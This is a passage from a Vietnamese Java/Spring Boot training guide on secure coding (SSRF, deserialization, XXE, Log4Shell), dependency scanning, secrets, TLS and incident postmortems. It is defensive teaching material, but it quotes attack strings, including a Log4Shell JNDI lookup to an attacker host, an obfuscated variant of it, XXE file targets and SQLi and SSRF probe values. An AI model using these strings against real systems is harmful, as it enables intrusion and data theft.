    for (InetAddress addr : InetAddress.getAllByName(uri.getHost())) {
        if (addr.isAnyLocalAddress() || addr.isLoopbackAddress() || addr.isLinkLocalAddress()
            || addr.isSiteLocalAddress() || addr.isMulticastAddress()) {
            throw new IllegalArgumentException("blocked address " + addr);
        }
        // Lưu ý: isSiteLocalAddress không bao phủ IPv6 ULA (fc00::/7), CGNAT 100.64/10... -> dùng thư viện/allowlist đầy đủ
    }
}
```

### 10.5 A08 — Insecure deserialization
Java native serialization (`ObjectInputStream.readObject`) trên dữ liệu không tin cậy → kẻ tấn công gửi **gadget chain** (chuỗi class hợp lệ có sẵn trên classpath, vd Commons Collections cũ) mà khi deserialize sẽ thực thi lệnh → **RCE**, xảy ra *trước* khi code của bạn kịp kiểm tra kiểu.

Phòng chống:
- **Không deserialize Java serialization từ nguồn không tin cậy.** Dùng JSON/Protobuf với schema rõ ràng.
- Nếu buộc phải: **`ObjectInputFilter`** (JEP 290, Java 9 / backport 8u121) — allowlist class, giới hạn độ sâu/kích thước; Java 17 thêm filter factory theo ngữ cảnh (JEP 415).
```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.acme.dto.*;java.base/*;!*;maxdepth=10;maxbytes=65536");
try (var in = new ObjectInputStream(input)) {
    in.setObjectInputFilter(filter);
    Object o = in.readObject();
}
// hoặc toàn JVM: -Djdk.serialFilter=...
```
- **Jackson polymorphic typing:** `ObjectMapper.enableDefaultTyping()` (đã deprecated) hoặc `@JsonTypeInfo(use = Id.CLASS)` cho phép JSON chỉ định class bất kỳ → cùng loại tấn công gadget. Dùng `Id.NAME` với `@JsonSubTypes` allowlist, hoặc `activateDefaultTyping` với `PolymorphicTypeValidator` chặt.
- Các thư viện YAML (SnakeYAML trước 2.0 với constructor mặc định cho phép tạo object bất kỳ) — dùng `SafeConstructor`/phiên bản mới.

### 10.6 XXE (XML External Entity)
Parser XML Java mặc định (cấu hình cũ) xử lý DTD và external entity → đọc file (`file:///etc/passwd`), SSRF, DoS ("billion laughs"). Trong OWASP 2021, XXE được gộp vào A05 (Security Misconfiguration).

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);   // chặn DTD hoàn toàn (khuyến nghị)
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
```
Tương tự cho `SAXParserFactory`, `XMLInputFactory` (`IS_SUPPORTING_EXTERNAL_ENTITIES=false`, `SUPPORT_DTD=false`), `TransformerFactory`, `SchemaFactory`. Tham khảo OWASP "XML External Entity Prevention Cheat Sheet".

### 10.7 A05, A02, A07 — cấu hình, mật mã, xác thực (điểm nhấn cho Spring)
- **Actuator lộ ra ngoài:** `/actuator/env` (có thể lộ property), `/actuator/heapdump` (tải về heap → chứa password, token, dữ liệu khách hàng!), `/actuator/loggers` (đổi log level). → Chỉ expose `health, info, prometheus`; cổng management riêng không đi qua Ingress; bảo vệ bằng Security.
- Stack trace/message chi tiết trả về client (`server.error.include-stacktrace=always`), H2 console bật ở prod, CORS rộng, default credentials, thiếu security headers (HSTS, CSP, `X-Content-Type-Options`).
- **Mật khẩu:** `PasswordEncoderFactories.createDelegatingPasswordEncoder()` (mặc định bcrypt, hỗ trợ nâng cấp thuật toán), hoặc Argon2/scrypt/PBKDF2. Không MD5/SHA-1/SHA-256 trần.
- **Mã hóa dữ liệu:** AES-GCM với IV/nonce ngẫu nhiên duy nhất mỗi lần; không ECB; không tự chế thuật toán; khóa nằm trong KMS/Vault, không trong code. `SecureRandom` cho token, không `Random`/`Math.random`.
- **JWT:** kiểm tra chữ ký với thuật toán cố định (chống `alg: none`/nhầm lẫn thuật toán), kiểm tra `exp`, `iss`, `aud`; access token ngắn hạn; không đặt dữ liệu nhạy cảm trong payload (chỉ base64). Spring Security Resource Server làm đúng mặc định khi cấu hình `issuer-uri`.
- Brute force: rate limit, lockout có kiểm soát, MFA; session fixation (Spring đổi session id sau login mặc định).

### 10.8 Case study: Log4Shell (CVE-2021-44228)
- **Lỗ hổng:** Log4j 2 (log4j-core 2.0-beta9 → 2.14.1) hỗ trợ *message lookup*: chuỗi `${...}` **trong nội dung log message** được diễn giải. Lookup `jndi` thực hiện truy vấn JNDI tới máy chủ LDAP/RMI do kẻ tấn công kiểm soát, máy chủ trả về tham chiếu tới class từ xa → JVM tải và thực thi → **RCE không cần xác thực**, CVSS 10.
- **Khai thác đơn giản đến đáng sợ:** chỉ cần app **log** một chuỗi do người dùng kiểm soát: `log.info("Login failed for user {}", username)` với `username = "${jndi:ldap://attacker.com/a}"`. Header `User-Agent`, `X-Forwarded-For`, field form… đều là vector.
- **Diễn biến bản vá:** 2.15.0 (tắt lookup mặc định một phần) → vẫn còn lỗ hổng trong cấu hình không mặc định (CVE-2021-45046) → 2.16.0 (gỡ message lookup, tắt JNDI mặc định) → 2.17.0 (DoS do đệ quy lookup, CVE-2021-45105) → 2.17.1 (CVE-2021-44832, RCE khi kẻ tấn công kiểm soát cấu hình). Biện pháp tạm thời từng được khuyến nghị: xóa class `JndiLookup` khỏi jar.
- **Spring Boot:** mặc định dùng Logback → không bị ảnh hưởng trực tiếp, **trừ khi** dùng `spring-boot-starter-log4j2`; nhưng `log4j-api` (không chứa lỗ hổng) và `log4j-to-slf4j` thường có trên classpath, gây hoảng loạn khi quét bằng tên.
- **Bài học cho Senior:**
  1. **Biết mình đang chạy gì:** nhiều tổ chức mất nhiều ngày chỉ để trả lời "service nào dùng log4j-core, version nào?" — kể cả transitive và trong image của bên thứ ba. → **SBOM** cho mọi artifact, kho tra cứu tập trung.
  2. Khả năng **vá và deploy nhanh** toàn bộ fleet (pipeline tự động, test tốt) là biện pháp bảo mật.
  3. **Defense in depth:** egress filtering (pod không được kết nối LDAP ra Internet) đã chặn được chuỗi khai thác ở nhiều nơi; WAF chỉ giúp một phần (payload dễ obfuscate: `${${lower:j}ndi:...}`).
  4. Tính năng "tiện lợi" khó đoán (lookup trong message) là bề mặt tấn công.
- Spring4Shell (CVE-2022-22965): data binding cho phép truy cập `class.module.classLoader` trên JDK 9+ khi deploy WAR trên Tomcat → ghi file JSP → RCE. Bài học tương tự: cập nhật framework kịp thời.

> 💡 **Góc nhìn Senior:** Bảo mật không phải một bước cuối, mà là **thuộc tính được dựng vào quy trình**: threat modeling khi thiết kế (STRIDE ở mức đơn giản), secure defaults trong template service của công ty, rule SAST/ArchUnit chặn mẫu nguy hiểm, test phân quyền tự động, SCA trong CI, và khả năng vá nhanh. Trong phỏng vấn, hãy luôn nói về **nhiều lớp phòng thủ** và **cách phát hiện** (logging/alert cho hành vi bất thường), không chỉ "validate input".

> ⚠️ **Lỗi thường gặp:** tin vào validation phía client; tự viết code chống SQLi bằng cách "escape dấu nháy"; tắt CSRF cho mọi thứ mà không hiểu (API stateless dùng token header thì hợp lý, app dùng cookie session thì không); log nguyên request body chứa mật khẩu; trả lỗi khác nhau cho "user không tồn tại" và "sai mật khẩu" (user enumeration).

### 🛠 Bài tập phần 10

**Bài 10.1 — Sửa IDOR và SQLi (Cơ bản)**
- Đề bài: Cho app mẫu có endpoint `GET /api/invoices/{id}` (IDOR) và `GET /api/users?sort=` (SQLi qua ORDER BY nối chuỗi). Viết test chứng minh khai thác được (user A đọc hóa đơn user B; `sort=(case when (select ...) then email else id end)` hoặc gây lỗi SQL), sau đó sửa.
- Tiêu chí: test khai thác chuyển từ "thành công" sang bị chặn (404/400); không phá hành vi hợp lệ.

**Bài 10.2 — SSRF và XXE (Trung bình)**
- Đề bài: Endpoint `POST /api/avatar/import {url}` tải ảnh từ URL, và `POST /api/import/xml` nhận file XML. Tái hiện SSRF tới `http://localhost:8081/actuator/env` (hoặc một service giả lập metadata) và XXE đọc file `/etc/hostname`. Sửa theo 10.4 và 10.6.
- Tiêu chí: có test cho từng payload tấn công (kể cả redirect từ URL public sang `127.0.0.1`, IP dạng thập phân `http://2130706433/`); cấu hình parser được gom vào một factory dùng chung.

**Bài 10.3 — Tái hiện Log4Shell trong lab cách ly (Nâng cao)**
- Đề bài: Trong môi trường **cách ly** (docker network không ra Internet), dựng app dùng `log4j-core:2.14.1` log header `User-Agent`, cùng một LDAP server giả lập để quan sát app **có thực hiện truy vấn JNDI ra ngoài** (chỉ cần chứng minh lookup xảy ra, ví dụ qua log của LDAP server / DNS, không cần payload RCE). Sau đó: (1) nâng cấp lên ≥ 2.17.1, (2) áp NetworkPolicy/egress chặn kết nối ra, (3) chạy OWASP Dependency-Check và Trivy để thấy công cụ phát hiện phiên bản lỗi.
- Tiêu chí: báo cáo ngắn theo định dạng postmortem (phần 12): timeline lab, cơ chế, phát hiện, khắc phục, bài học; **tuyệt đối không** chạy ngoài môi trường lab của bạn.

<details>
<summary>Gợi ý lời giải</summary>

- 10.1: sort → allowlist map; IDOR → `findByIdAndOwnerId`; test bằng `@WebMvcTest` + `jwt().jwt(j -> j.subject("userA"))`.
- 10.2: chặn redirect: `HttpClient.newBuilder().followRedirects(HttpClient.Redirect.NEVER)`; `InetAddress.getByName("2130706433")` resolve thành `127.0.0.1` → bị `isLoopbackAddress` chặn nếu kiểm tra sau khi resolve. Để chống DNS rebinding: kết nối tới IP đã kiểm tra (đặt header `Host` tương ứng) hoặc dùng proxy egress có allowlist.
- 10.3: quan sát lookup bằng cách để LDAP server giả lập (vd một TCP listener đơn giản ghi log kết nối đến cổng 1389) — chỉ cần thấy kết nối đến là chứng minh lỗ hổng. Dependency-Check sẽ báo CVE-2021-44228 cho `log4j-core-2.14.1.jar`.

</details>

---

<a id="p11"></a>
## 11. Supply chain, secrets management & TLS

### 11.1 Dependency scanning (SCA)
Ứng dụng Spring Boot điển hình có 100–200 jar, phần lớn là transitive. **Software Composition Analysis** đối chiếu chúng với cơ sở dữ liệu lỗ hổng.

| Công cụ | Cách hoạt động | Lưu ý |
|---|---|---|
| **OWASP Dependency-Check** | Mã nguồn mở; nhận diện thư viện → CPE → tra **NVD** | Cần NVD API key (tải dữ liệu chậm nếu không có); **false positive** do so khớp CPE → quản lý bằng file `suppression.xml` có lý do; cache dữ liệu NVD trong CI |
| **Snyk** | SaaS, DB lỗ hổng riêng (curated), gợi ý bản nâng cấp tối thiểu, đường đi transitive, PR tự động | Thương mại (có gói free); có cả container & IaC scan |
| **Dependabot** (GitHub) | *Alerts* từ GitHub Advisory Database + *security updates* (PR nâng version vá) + *version updates* định kỳ | Cấu hình `.github/dependabot.yml`; nên gom nhóm PR (`groups`) để tránh spam |
| Renovate | Tương tự Dependabot, cấu hình linh hoạt hơn, đa nền tảng | |
| Trivy / Grype | Quét image container (OS package + jar), SBOM, IaC | |
| OSV-Scanner | Dựa trên cơ sở dữ liệu OSV | |

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: maven
    directory: "/"
    schedule: { interval: weekly }
    groups:
      spring:
        patterns: ["org.springframework*"]
    open-pull-requests-limit: 10
  - package-ecosystem: docker
    directory: "/"
    schedule: { interval: weekly }
  - package-ecosystem: github-actions
    directory: "/"
    schedule: { interval: weekly }
```

```xml
<plugin>
  <groupId>org.owasp</groupId>
  <artifactId>dependency-check-maven</artifactId>
  <version>11.1.0</version>
  <configuration>
    <failBuildOnCVSS>7</failBuildOnCVSS>
    <suppressionFiles><suppressionFile>dependency-check-suppressions.xml</suppressionFile></suppressionFiles>
    <formats><format>HTML</format><format>SARIF</format></formats>
  </configuration>
</plugin>
```

**Quy trình xử lý CVE (triage):** (1) thư viện có thật sự nằm trong runtime classpath không (`test` scope thì rủi ro thấp)? (2) đoạn code có lỗ hổng có **reachable** từ app không (vd CVE của một tính năng bạn không dùng)? (3) có bị khai thác ngoài thực tế không (CISA KEV, EPSS)? (4) nâng cấp (thường qua BOM của Spring Boot — nâng patch version Boot là cách an toàn nhất), hoặc override version trong `dependencyManagement`, hoặc suppress **có thời hạn và lý do**.

**Các mối đe dọa chuỗi cung ứng khác:** typosquatting (package tên gần giống), **dependency confusion** (đặt package public trùng tên package nội bộ — cấu hình repository manager để groupId nội bộ chỉ lấy từ repo nội bộ), maintainer bị chiếm tài khoản, build server bị xâm nhập. Biện pháp: repository manager làm proxy duy nhất, **checksum/signature verification** (Gradle `verification-metadata.xml`), **SBOM** (CycloneDX/SPDX), **SLSA provenance**, ký image bằng **Sigstore cosign** và kiểm tra chữ ký khi deploy.

### 11.2 Secrets management
**Nguyên tắc:** secret không nằm trong Git, image, log, biến môi trường hiển thị công khai; có chủ sở hữu, được **rotate**, quyền tối thiểu, truy cập được **audit**.

Các cấp độ trưởng thành:
1. ❌ Hard-code trong `application.yml` commit vào Git.
2. Biến môi trường từ CI/CD secret store (ổn cho đơn giản; nhưng env dễ lộ qua `/actuator/env`, crash dump, `ps e`).
3. **Kubernetes Secret** mount dạng **file** (`spring.config.import=optional:configtree:/etc/secrets/`) + encryption at rest + RBAC.
4. **Secret manager tập trung** (HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager, Azure Key Vault) đồng bộ vào cluster qua **External Secrets Operator**/CSI driver, hoặc app đọc trực tiếp (Spring Cloud Vault, Spring Cloud AWS).
5. **Dynamic secrets:** Vault database secrets engine cấp **user DB tạm thời** cho mỗi instance với TTL; tự thu hồi → lộ cũng hết hạn nhanh. **Workload identity** (IRSA trên EKS, Workload Identity trên GKE) — pod nhận credential cloud ngắn hạn, không cần access key.

```yaml
# Spring Boot đọc secret từ file mount (mỗi file = một property, tên file = key)
spring:
  config:
    import: "optional:configtree:/etc/secrets/"
# /etc/secrets/spring.datasource.password  -> property spring.datasource.password
```

**Phát hiện secret bị commit:** `gitleaks`/`trufflehog` trong pre-commit và CI; GitHub secret scanning + push protection. Khi lộ: **rotate ngay** (coi như đã bị lấy), rồi mới dọn lịch sử Git, kiểm tra audit log xem đã bị dùng chưa.

### 11.3 TLS cơ bản cho backend developer
- **TLS** cung cấp: bảo mật (mã hóa), toàn vẹn, **xác thực** server (và client nếu mTLS) qua **chứng chỉ X.509** do CA ký.
- **Handshake TLS 1.3** (rút gọn): client gửi `ClientHello` (cipher suites, key share, **SNI** — tên host), server trả `ServerHello` + chứng chỉ + chữ ký, hai bên dẫn xuất khóa phiên bằng (EC)DHE → 1-RTT, **forward secrecy** bắt buộc. TLS 1.2 cần 2-RTT; TLS 1.0/1.1 đã bị loại bỏ.
- **Chuỗi tin cậy:** chứng chỉ leaf → intermediate CA → root CA nằm trong **truststore**. Server phải gửi kèm intermediate; thiếu → một số client lỗi.
- **Java:** keystore (khóa riêng + chứng chỉ của mình) vs truststore (CA mình tin; mặc định `$JAVA_HOME/lib/security/cacerts`). Spring Boot 3.1+ có **SSL bundles**:

```yaml
spring:
  ssl:
    bundle:
      pem:
        server:
          keystore:
            certificate: "file:/etc/tls/tls.crt"
            private-key: "file:/etc/tls/tls.key"
        partner-client:
          truststore:
            certificate: "file:/etc/tls/partner-ca.crt"
server:
  ssl:
    bundle: server
# RestClient dùng bundle: restClientBuilder.apply(ssl.fromBundle("partner-client")) (qua ClientHttpRequestFactorySettings / SslBundles)
```

- **mTLS** giữa các service: thường do **service mesh** (Istio, Linkerd) đảm nhận trong suốt với app; hoặc ở API gateway với đối tác.
- **TLS termination:** tại Ingress/LB (đơn giản, traffic nội bộ không mã hóa) vs end-to-end (an toàn hơn, phức tạp hơn). Zero-trust → mã hóa cả nội bộ.
- **Lỗi thường gặp:** `PKIX path building failed` (CA không có trong truststore — sửa bằng cách thêm đúng CA, **không** tắt verification); `No subject alternative names matching` (hostname không khớp SAN); chứng chỉ hết hạn (theo dõi và alert ngày hết hạn, tự động gia hạn bằng cert-manager/ACME); `TrustManager` "trust all" copy từ StackOverflow vào production = vô hiệu hóa TLS.

> 💡 **Góc nhìn Senior:** Chuẩn bị "kịch bản" cho câu hỏi "secret của service bạn được quản lý thế nào, rotate ra sao, nếu lộ thì làm gì?" — đây là câu hỏi phân loại ứng viên rất nhanh. Câu trả lời tốt nói về nguồn sự thật (Vault/Secrets Manager), cách secret vào pod (file/ESO), workload identity, rotation không downtime (hai credential song song, reload connection pool), audit và phát hiện rò rỉ.

### 🛠 Bài tập phần 11

**Bài 11.1 — SCA trong build (Cơ bản)**
- Đề bài: Thêm OWASP Dependency-Check vào project, cố ý thêm `jackson-databind` hoặc `commons-text` phiên bản cũ có CVE nổi tiếng. Đọc báo cáo, sửa bằng nâng cấp; tạo một suppression có lý do cho một false positive.
- Tiêu chí: build fail khi CVSS ≥ 7; giải thích từng mục trong báo cáo (CPE, CVSS, đường đi dependency).

**Bài 11.2 — Secret từ file và rotation (Trung bình)**
- Đề bài: Trên kind, tạo Secret chứa mật khẩu DB, mount dạng file, Spring đọc bằng `configtree`. Thực hiện rotate mật khẩu: tạo user/mật khẩu mới trên Postgres, cập nhật Secret, rolling restart — không downtime. Thêm gitleaks vào pre-commit/CI và thử commit một secret giả.
- Tiêu chí: k6 chạy suốt quá trình rotate không lỗi; gitleaks chặn commit.

**Bài 11.3 — mTLS giữa hai service (Nâng cao)**
- Đề bài: Tạo CA tự ký bằng `openssl` (hoặc `step` CLI), cấp chứng chỉ cho `order` (client) và `payment` (server, `client-auth: need`). Cấu hình bằng Spring SSL bundles. Kiểm tra: không có chứng chỉ client → handshake fail; chứng chỉ do CA khác ký → fail; hostname sai → fail.
- Tiêu chí: test tự động cho 3 trường hợp lỗi và 1 trường hợp thành công; giải thích từng thông báo lỗi.

<details>
<summary>Gợi ý lời giải</summary>

- 11.1: ví dụ `commons-text:1.9` (CVE-2022-42889 "Text4Shell", sửa ở 1.10.0).
- 11.2: rotation không downtime: tồn tại song song 2 credential hợp lệ trong thời gian chuyển; HikariCP chỉ dùng password khi tạo connection mới → sau rollout, thu hồi credential cũ. Có thể đặt `maxLifetime` để connection cũ dần được thay.
- 11.3: `server.ssl.client-auth=need`, bundle server có cả truststore chứa CA; client bundle có keystore (chứng chỉ client) + truststore. Lỗi điển hình: `bad_certificate`, `PKIX path building failed`, `No subject alternative names matching IP address`.

</details>

---

<a id="p12"></a>
## 12. Xử lý sự cố & văn hóa postmortem

### 12.1 Vòng đời sự cố
```
Phát hiện → Phân loại mức độ → Huy động → Giảm thiểu (mitigate) → Khôi phục → Theo dõi → Postmortem → Action items
```
- **Phát hiện:** lý tưởng là alert theo SLO trước khi khách hàng báo. Thời gian phát hiện (TTD) là một chỉ số cần cải thiện.
- **Phân loại (severity):** ví dụ SEV1 — toàn bộ chức năng chính ngừng/ mất dữ liệu/ sự cố bảo mật; SEV2 — suy giảm đáng kể một phần; SEV3 — ảnh hưởng nhỏ, có workaround. Mức độ quyết định ai được gọi và tần suất cập nhật.
- **Vai trò** (theo mô hình Incident Command): **Incident Commander** (điều phối, ra quyết định, *không* tự debug), **Operations/Subject-matter experts** (điều tra, thực thi), **Communications lead** (cập nhật stakeholder/khách hàng theo nhịp cố định), **Scribe** (ghi timeline).
- **Mitigate trước, root cause sau:** ưu tiên dừng thiệt hại — rollback bản deploy gần nhất, tắt feature flag, scale up, chuyển traffic sang region khác, bật chế độ degrade (tắt tính năng không thiết yếu). Debug tận gốc khi hệ thống đã ổn định. Câu hỏi đầu tiên luôn là: **"Gần đây có gì thay đổi?"** (deploy, config, traffic, dependency, certificate hết hạn).
- **Giao tiếp:** một kênh sự cố riêng; cập nhật định kỳ (vd mỗi 30 phút với SEV1) kể cả khi "chưa có gì mới"; status page cho khách hàng.

### 12.2 Chẩn đoán có phương pháp cho service Java
1. Phạm vi: tất cả instance hay một vài? Tất cả endpoint hay một? Tất cả khách hay một nhóm/region?
2. RED của service và **từng dependency** (DB, cache, API ngoài) → nút thắt nằm ở đâu.
3. USE của tài nguyên: CPU throttling, heap/GC pause, thread pool bão hòa, connection pool `pending`, Kafka consumer lag.
4. Trace của request chậm/lỗi; log theo `traceId`.
5. Bằng chứng JVM trước khi restart: `jcmd <pid> Thread.print` (3 lần cách nhau vài giây — tìm thread kẹt cùng chỗ), `jcmd <pid> GC.heap_info`, heap dump nếu nghi leak (cẩn thận: heap dump gây STW và tốn đĩa), JFR (`jcmd <pid> JFR.start duration=60s filename=/tmp/rec.jfr`).
6. Kiểm tra giả thuyết **một lần một thay đổi**, ghi vào timeline.

### 12.3 Postmortem không đổ lỗi (blameless)
Mục tiêu: **học từ sự cố để hệ thống tốt hơn**, không tìm người để phạt. Nếu mọi người sợ bị phạt, họ giấu thông tin → tổ chức không học được gì. Giả định: mọi người đã hành động hợp lý với thông tin họ có lúc đó; câu hỏi là *hệ thống* (công cụ, quy trình, thiết kế) nào đã cho phép lỗi xảy ra và lan rộng.

**Mẫu postmortem:**
```markdown
# Postmortem: Checkout lỗi 503 — 2026-03-14
**Mức độ:** SEV2 · **Thời gian ảnh hưởng:** 10:42–11:31 (49 phút) · **Tác giả:** ... · **Trạng thái:** Đã review

## Tóm tắt
Một câu đến một đoạn: chuyện gì xảy ra, ảnh hưởng thế nào, đã khắc phục ra sao.

## Ảnh hưởng
- 18% request checkout thất bại; ước tính 2.300 đơn hàng không hoàn tất; tiêu hao 113% error budget tháng.

## Timeline (giờ VN)
- 10:30 Deploy order-service 1.14.0 (thêm gọi API khuyến mãi trong transaction)
- 10:42 Alert CheckoutErrorBudgetFastBurn bắn
- 10:47 On-call xác nhận, mở kênh sự cố, IC: ...
- 10:58 Phát hiện hikaricp_connections_pending tăng, API khuyến mãi p99 = 4s
- 11:20 Rollback về 1.13.2
- 11:31 Error rate về bình thường; theo dõi thêm 30 phút

## Nguyên nhân gốc & các yếu tố góp phần
- Gọi HTTP (không timeout phù hợp) bên trong @Transactional giữ connection DB → cạn pool khi API khuyến mãi chậm.
- Yếu tố góp phần: load test không bao gồm kịch bản dependency chậm; không có timeout mặc định cho RestClient; canary không bật cho service này.

## Điều gì đã tốt
- Alert SLO phát hiện trong 12 phút; rollback một lệnh.

## Điều gì chưa tốt / may mắn
- Mất 33 phút từ phát hiện đến quyết định rollback.

## Action items
| Hành động | Loại | Người phụ trách | Hạn |
|---|---|---|---|
| Timeout mặc định 2s cho mọi RestClient qua builder dùng chung | Phòng ngừa | ... | 2026-03-21 |
| Rule ArchUnit/Sonar: cấm gọi HTTP client trong @Transactional | Phòng ngừa | ... | 2026-03-28 |
| Bật canary + auto-rollback cho order-service | Giảm thiểu | ... | 2026-04-04 |
| Runbook: "rollback trước nếu sự cố trong 1h sau deploy" | Quy trình | ... | 2026-03-18 |
```
- **5 Whys** hữu ích nhưng dễ dẫn tới *một* nguyên nhân tuyến tính; sự cố thật thường có **nhiều yếu tố góp phần**. Tránh kết luận "lỗi con người" — hỏi tiếp: tại sao hệ thống cho phép một lỗi đơn lẻ gây ảnh hưởng lớn?
- Action items phải **cụ thể, có chủ, có hạn**, được theo dõi như công việc thật — postmortem không có action item hoàn thành chỉ là tài liệu.
- Chia sẻ rộng rãi; đọc postmortem của nơi khác (công khai của các công ty lớn) là cách học rẻ.

**Phòng ngừa chủ động:** runbook cho alert, game day / chaos engineering (giết pod, chèn latency vào dependency), kiểm tra định kỳ restore backup, on-call có handover và giới hạn tải.

> 💡 **Góc nhìn Senior:** Câu hỏi hành vi "kể về một sự cố production bạn từng xử lý" xuất hiện ở gần như mọi vòng Senior. Chuẩn bị theo cấu trúc: bối cảnh & ảnh hưởng → bạn phát hiện thế nào → các giả thuyết và cách loại trừ (bằng dữ liệu nào) → mitigation → root cause → thay đổi hệ thống/quy trình sau đó → bài học. Người phỏng vấn đánh giá **phương pháp và sự bình tĩnh**, và việc bạn cải thiện hệ thống chứ không chỉ "sửa bug".

> ⚠️ **Lỗi thường gặp:** nhiều người cùng thay đổi production song song khi debug (không biết thay đổi nào có tác dụng); restart ngay mà không thu bằng chứng; postmortem tìm người có lỗi; action item "cẩn thận hơn" (không đo được, không có tác dụng).

### 🛠 Bài tập phần 12

**Bài 12.1 — Viết postmortem (Cơ bản)**
- Đề bài: Chọn một sự cố bạn từng gặp (hoặc một postmortem công khai) và viết lại theo mẫu 12.3.
- Tiêu chí: timeline có mốc thời gian; ít nhất 2 yếu tố góp phần; ≥ 3 action item cụ thể có chủ và hạn; không có câu đổ lỗi cá nhân.

**Bài 12.2 — Game day (Trung bình)**
- Đề bài: Với hệ thống dựng ở phần 7–9, tổ chức game day: một người bí mật chèn sự cố (WireMock delay 5s cho API ngoài, hoặc giảm Hikari pool xuống 2, hoặc NetworkPolicy chặn Redis), người còn lại xử lý chỉ dựa vào dashboard/alert/log/trace.
- Tiêu chí: ghi thời gian phát hiện, thời gian mitigate; viết postmortem ngắn và cập nhật runbook.

**Bài 12.3 — Runbook & tự động hóa (Nâng cao)**
- Đề bài: Viết runbook cho 3 alert (error budget burn, consumer lag Kafka cao, pod OOMKilled lặp lại): triệu chứng, dashboard cần xem, lệnh chẩn đoán, các bước mitigation, khi nào escalate. Tự động hóa một bước (vd script thu thập thread dump + heap info + `kubectl describe` của mọi pod lỗi vào một thư mục có timestamp).
- Tiêu chí: một đồng nghiệp chưa biết hệ thống làm theo được runbook trong buổi game day.

<details>
<summary>Gợi ý lời giải</summary>

- 12.3: script thu thập:
```bash
#!/usr/bin/env bash
set -euo pipefail
NS=${1:-shop}; APP=${2:-order-service}; OUT=incident-$(date +%Y%m%d-%H%M%S); mkdir -p "$OUT"
for p in $(kubectl -n "$NS" get pods -l app="$APP" -o name); do
  n=${p#pod/}
  kubectl -n "$NS" describe "$p" > "$OUT/$n.describe.txt"
  kubectl -n "$NS" logs "$p" --since=30m > "$OUT/$n.log" || true
  kubectl -n "$NS" logs "$p" --previous > "$OUT/$n.previous.log" 2>/dev/null || true
  kubectl -n "$NS" exec "$n" -- jcmd 1 Thread.print > "$OUT/$n.threads.txt" 2>/dev/null || true
  kubectl -n "$NS" exec "$n" -- jcmd 1 GC.heap_info > "$OUT/$n.heap.txt" 2>/dev/null || true
done
echo "Saved to $OUT"
```
(`jcmd 1` giả định Java là PID 1 trong container — đúng khi dùng ENTRYPOINT exec form; image distroless không có `jcmd` → dùng `kubectl debug` với image JDK.)

</details>

---

<a id="du-an-mini"></a>
## Dự án mini

### "Ship it safely": đưa một Spring Boot service lên production-like Kubernetes
Lấy service Order từ dự án mini Module 15 (hoặc một service tương đương: REST + PostgreSQL + Kafka + gọi API ngoài). Thời lượng 2 ngày.

**Yêu cầu chức năng**
1. Build: Maven multi-module (domain / application / infrastructure / app) với BOM, enforcer `dependencyConvergence`, wrapper; hoặc Gradle với version catalog + convention plugin.
2. Container: Dockerfile multi-stage + layered jar (hoặc Jib), non-root, exec-form ENTRYPOINT, cấu hình JVM cho container; `compose.yaml` cho dev local (Postgres, Kafka, Redis, Prometheus, Grafana, Jaeger/Tempo, OTel Collector).
3. Kubernetes (kind/k3d/minikube): Deployment (3 replica), Service, Ingress/Gateway, ConfigMap, Secret mount dạng file, probes Actuator (startup/liveness/readiness đúng nguyên tắc), resources hợp lý, preStop + graceful shutdown, PDB, HPA.
4. CI/CD (GitHub Actions hoặc GitLab CI): build + unit + integration (Testcontainers) → SAST/SCA (SpotBugs+FindSecBugs, Dependency-Check) → image + SBOM + Trivy → push tag SHA → cập nhật manifest (GitOps nếu có thể). Dependabot cho Maven, Docker, Actions.
5. Observability: structured logging JSON có `traceId`; metric RED + custom business metric; tracing xuyên HTTP và Kafka; dashboard Grafana; SLO cho checkout + rule burn-rate.
6. Security: sửa và có test cho ít nhất 3 lỗ hổng gài sẵn (IDOR, SQLi qua sort, SSRF hoặc XXE); Actuator chỉ expose `health, info, prometheus` trên cổng management riêng; không secret nào trong Git (gitleaks trong CI).

**Yêu cầu phi chức năng**
- Rolling update dưới tải 50 req/s (k6) với **0 lỗi**.
- Image runtime < 300MB, 0 CVE CRITICAL có bản vá.
- Pipeline PR < 10 phút; build lặp lại được (version plugin/ image ghim).
- Pod không bị OOMKilled dưới tải k6 10 phút; không CPU throttling đáng kể (theo dõi `container_cpu_cfs_throttled_seconds_total`).
- Game day: chèn một sự cố (dependency chậm), phát hiện qua alert, mitigate, viết postmortem.

**Tiêu chí chấm (100 điểm)**

| Hạng mục | Điểm |
|---|---|
| Build (cấu trúc module, quản lý dependency, enforcer, reproducible) | 10 |
| Docker image (kích thước, layer, non-root, JVM flags đúng, giải thích lựa chọn) | 15 |
| Kubernetes (probes đúng, resources, graceful shutdown chứng minh 0 lỗi khi rollout, PDB/HPA) | 20 |
| CI/CD (stage hợp lý, build once deploy many, security của pipeline: permissions, pin, OIDC/secret) | 15 |
| Observability (log–metric–trace liên kết, dashboard RED/USE, SLO + burn-rate alert) | 15 |
| Security (lỗ hổng được sửa có test, SCA, secrets, Actuator) | 15 |
| Postmortem game day + README (kiến trúc, cách chạy, quyết định & trade-off) | 10 |

Trừ điểm: dùng tag `latest`; secret trong repo; DB trong liveness probe; `-Xmx` bằng memory limit; `--force` push lên `main`; pipeline xanh nhờ `continue-on-error`.

---

<a id="checklist-tu-danh-gia"></a>
## Checklist tự đánh giá

- [ ] Tôi phân biệt được lifecycle/phase/goal của Maven, biết `mvn verify` chạy những gì và vì sao integration test nên chạy bằng Failsafe.
- [ ] Tôi giải thích được dependency scopes, luật nearest-wins của Maven (so với highest-wins của Gradle) và chẩn đoán `NoSuchMethodError` bằng `dependency:tree -Dverbose`.
- [ ] Tôi dùng được `dependencyManagement`, BOM (`scope=import`), enforcer và tổ chức project multi-module.
- [ ] Tôi so sánh được Maven và Gradle (incremental build, build cache, `api` vs `implementation`) và chọn có lập luận.
- [ ] Tôi giải thích được Git Flow vs trunk-based, merge vs rebase, khi nào không được rebase, và dùng `--force-with-lease`.
